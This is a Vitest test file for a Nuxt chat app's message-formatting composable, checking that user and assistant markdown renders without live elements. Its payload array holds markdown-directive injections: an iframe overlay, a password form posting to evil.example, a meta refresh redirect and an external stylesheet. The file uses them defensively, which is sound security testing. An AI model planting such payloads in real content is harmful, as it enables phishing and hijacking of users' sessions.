import { parseMarkdown } from '@nuxtjs/mdc/runtime'
import MDCRenderer from '@nuxtjs/mdc/runtime/components/MDCRenderer.vue'
import { mountSuspended } from '@nuxt/test-utils/runtime'
import { describe, expect, it } from 'vitest'
import { useChatFormat } from '../../../app/composables/chat-format'
import A from '../../../app/components/prose/A.vue'
import Img from '../../../app/components/prose/Img.vue'

const LIVE_ELEMENT_TAGS = ['iframe', 'form', 'input', 'style', 'meta', 'link']

const DIRECTIVE_PAYLOADS = [
  '::iframe{src="https://evil.example" style="position:fixed;inset:0"}\n::',
  '::form{action="https://evil.example"}\n:input{name=password}\n::',
  ':style[body{display:none}]',
  ':span{style="position:fixed;inset:0"}[x]',
  ':meta{http-equiv="refresh" content="0;url=https://evil.example"}',
  ':link{rel=stylesheet href="https://evil.example/a.css"}',
  ':binding{value="$doc.updateRuntimeData"}',
  '{{ $doc.updateRuntimeData }}',
  'Vec<String> and <div>x</div>\n```js\ncode\n```',
]

describe('useChatFormat', () => {
  it('overrides img with the external-image-blocking component', () => {
    const { messageComponents, components, imageComponents } = useChatFormat()

    expect(messageComponents.img).toBe(Img)
    expect(components.img).toBe(Img)
    expect(imageComponents.img).toBe(Img)
  })

  it('keeps the anchor override on message components only', () => {
    const { messageComponents, components } = useChatFormat()

    expect(messageComponents.a).toBe(A)
    expect('a' in components).toBe(false)
  })

  it('unwraps tables for assistant messages and pre for user messages',
    () => {
      const { getUnwrap } = useChatFormat()

      expect(getUnwrap('assistant')).toBe('strong,details,table')
      expect(getUnwrap('user')).toBe('strong,details,pre')
    })

  it('returns stable parser options per role', () => {
    const { getParserOptions } = useChatFormat()

    expect(getParserOptions('user')).toBe(getParserOptions('user'))
    expect(getParserOptions('assistant')).toBe(getParserOptions('assistant'))
    expect(getParserOptions('user')).not.toBe(getParserOptions('assistant'))
  })

  it('disables raw html parsing for user messages only', () => {
    const { getParserOptions } = useChatFormat()
    const userPlugins = getParserOptions('user').rehype?.plugins

    expect(getParserOptions('user').highlight).toBe(false)
    expect(userPlugins?.['rehype-raw']).toBe(false)
    expect(userPlugins?.['rehype-raw-html-as-text']).toBeDefined()
    expect(getParserOptions('assistant').rehype).toBeUndefined()
    expect(getParserOptions('system').rehype).toBeUndefined()
  })

  it('mounts hostile user payloads without throwing or live elements',
    async () => {
      const { getParserOptions } = useChatFormat()

      for (const payload of DIRECTIVE_PAYLOADS) {
        const parsed = await parseMarkdown(payload, getParserOptions('user'))
        const wrapper = await mountSuspended(MDCRenderer, {
          props: { body: parsed.body, data: parsed.data },
        })
        const html = wrapper.html()

        for (const tag of LIVE_ELEMENT_TAGS) {
          expect(html).not.toContain(`<${tag}`)
        }

        expect(wrapper.element.querySelector('[style]')).toBeNull()
      }
    })

  it('disables mdc syntax for every role and html tokenizing for user only',
    () => {
      const { getParserOptions } = useChatFormat()
      const userPlugins = getParserOptions('user').remark?.plugins
      const assistantPlugins = getParserOptions('assistant').remark?.plugins

      expect(userPlugins?.['remark-mdc']).toBe(false)
      expect(userPlugins?.['remark-disable-html']).toBeDefined()
      expect(assistantPlugins?.['remark-mdc']).toBe(false)
      expect(assistantPlugins?.['remark-disable-html']).toBeUndefined()
      expect(getParserOptions('assistant')).toEqual({
        highlight: false,
        remark: { plugins: { 'remark-mdc': false } },
      })
      expect(getParserOptions('system')).toBe(getParserOptions('assistant'))
    })

  it('mounts hostile assistant payloads without throwing or live elements',
    async () => {
      const { getParserOptions } = useChatFormat()

      for (const payload of DIRECTIVE_PAYLOADS) {
        const parsed = await parseMarkdown(
          payload,
          getParserOptions('assistant'),
        )
        const wrapper = await mountSuspended(MDCRenderer, {
          props: { body: parsed.body, data: parsed.data },
        })
        const html = wrapper.html()

        for (const tag of LIVE_ELEMENT_TAGS) {
          expect(html).not.toContain(`<${tag}`)
        }

        expect(wrapper.element.querySelector('[style]')).toBeNull()
      }
    })
})
